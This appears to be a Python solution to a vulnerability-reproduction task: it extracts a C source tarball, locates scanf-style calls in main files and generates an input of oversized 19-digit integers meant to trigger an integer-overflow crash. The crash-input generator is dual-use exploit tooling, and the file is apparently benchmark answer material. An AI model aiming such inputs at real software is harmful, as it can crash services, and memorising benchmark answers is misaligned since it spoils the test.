import os
import tarfile
import tempfile
import re
import shutil


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = None

        def default_poc() -> bytes:
            # Two 19-digit integers separated by space and terminated by newline
            return b"9999999999999999999 9999999999999999999\n"

        def extract_tarball(path: str) -> str:
            nonlocal tmpdir
            tmpdir = tempfile.mkdtemp(prefix="pocgen_")
            try:
                with tarfile.open(path, "r:*") as tf:
                    tf.extractall(tmpdir)
            except Exception:
                # If extraction fails, return empty dir and fall back later
                return tmpdir
            return tmpdir

        def read_text_file(path: str) -> str:
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    return f.read()
            except Exception:
                return ""

        def parse_c_string_literal(s: str, start_idx: int):
            # s[start_idx] should be at opening quote
            if start_idx >= len(s) or s[start_idx] != '"':
                return None, None
            j = start_idx + 1
            escaped = False
            out_chars = []
            while j < len(s):
                c = s[j]
                if escaped:
                    if c == 'n':
                        out_chars.append('\n')
                    elif c == 't':
                        out_chars.append('\t')
                    elif c == 'r':
                        out_chars.append('\r')
                    elif c == '\\':
                        out_chars.append('\\')
                    elif c == '"':
                        out_chars.append('"')
                    else:
                        out_chars.append(c)
                    escaped = False
                else:
                    if c == '\\':
                        escaped = True
                    elif c == '"':
                        return "".join(out_chars), j + 1
                    else:
                        out_chars.append(c)
                j += 1
            return None, None

        def extract_format_string(call_text: str):
            m = re.search(r'"', call_text)
            if not m:
                return None
            idx = m.start()
            full_fmt_parts = []
            while True:
                part, next_idx = parse_c_string_literal(call_text, idx)
                if part is None:
                    break
                full_fmt_parts.append(part)
                # Skip whitespace between adjacent literals
                i = next_idx
                while i < len(call_text) and call_text[i].isspace():
                    i += 1
                if i < len(call_text) and call_text[i] == '"':
                    idx = i
                    continue
                break
            if not full_fmt_parts:
                return None
            return "".join(full_fmt_parts)

        def parse_scanf_format(fmt: str):
            tokens = []
            convs = []
            i = 0
            last_was_ws = False
            while i < len(fmt):
                ch = fmt[i]
                if ch.isspace():
                    if not last_was_ws:
                        tokens.append(("ws", None))
                        last_was_ws = True
                    i += 1
                    continue
                last_was_ws = False
                if ch != '%':
                    tokens.append(("lit", ch))
                    i += 1
                    continue
                # Handle %%
                if i + 1 < len(fmt) and fmt[i + 1] == '%':
                    tokens.append(("lit", '%'))
                    i += 2
                    continue
                # Parse real conversion
                j = i + 1
                if j < len(fmt) and fmt[j] == '*':
                    j += 1
                # Width
                while j < len(fmt) and fmt[j].isdigit():
                    j += 1
                # Length modifiers
                if j + 1 < len(fmt) and fmt[j:j + 2] in ("hh", "ll"):
                    j += 2
                elif j < len(fmt) and fmt[j] in "hljztL":
                    j += 1
                if j >= len(fmt):
                    break
                convch = fmt[j]
                tokens.append(("conv", convch))
                convs.append(convch)
                i = j + 1
            return tokens, convs

        def find_target_format(root_dir: str):
            c_files = []
            for r, _, files in os.walk(root_dir):
                for name in files:
                    if name.endswith(".c"):
                        c_files.append(os.path.join(r, name))

            main_files = []
            for path in c_files:
                text = read_text_file(path)
                if not text:
                    continue
                if re.search(r'\bint\s+main\s*\(', text):
                    main_files.append((path, text))

            if not main_files:
                return None

            best = None
            best_priority = -1
            int_spec_set = set("diouxXp")

            for path, text in main_files:
                for m in re.finditer(r'\b(scanf|fscanf|sscanf)\s*\(', text):
                    start = m.end()
                    sub = text[start:]
                    depth = 1
                    end_idx = None
                    for i, ch in enumerate(sub):
                        if ch == '(':
                            depth += 1
                        elif ch == ')':
                            depth -= 1
                            if depth == 0:
                                end_idx = i
                                break
                    if end_idx is None:
                        continue
                    call_text = sub[:end_idx]
                    fmt = extract_format_string(call_text)
                    if not fmt:
                        continue
                    tokens, convs = parse_scanf_format(fmt)
                    int_count = sum(1 for c in convs if c in int_spec_set)
                    if int_count >= 2:
                        priority = int_count
                        if "width" in fmt or "prec" in fmt:
                            priority += 1
                        if priority > best_priority:
                            best_priority = priority
                            best = (fmt, tokens, int_count, len(convs))
            return best

        try:
            root = extract_tarball(src_path)
            if not root:
                return default_poc()

            fmt_info = find_target_format(root)
            if not fmt_info:
                return default_poc()

            _, tokens, _, _ = fmt_info
            big_int = "9" * 19
            out_parts = []
            for kind, val in tokens:
                if kind == "ws":
                    out_parts.append(" ")
                elif kind == "lit":
                    out_parts.append(val)
                elif kind == "conv":
                    convch = val
                    if convch in "diouxXp":
                        out_parts.append(big_int)
                    elif convch in "eEfFgGaA":
                        out_parts.append("1")
                    elif convch in "sc[":
                        out_parts.append("word")
                    elif convch == "c":
                        out_parts.append("A")
                    else:
                        out_parts.append("1")
            out_str = "".join(out_parts) + "\n"
            return out_str.encode("ascii", "replace")
        except Exception:
            return default_poc()
        finally:
            if tmpdir and os.path.isdir(tmpdir):
                try:
                    shutil.rmtree(tmpdir)
                except Exception:
                    pass
